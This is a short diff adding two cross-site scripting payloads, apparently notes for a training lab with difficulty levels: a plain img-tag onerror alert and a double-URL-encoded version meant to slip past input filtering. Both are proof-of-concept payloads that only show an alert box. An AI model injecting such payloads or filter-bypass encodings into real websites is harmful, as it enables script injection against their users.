@@ -1,0 +1,2 @@
+LOW payload: <img src=x onerror=alert('1')>
+Medium payload (Double encoding): %253Cimg%2520src%253Dx%2520onerror%253Dalert(%25271%2527)%253E
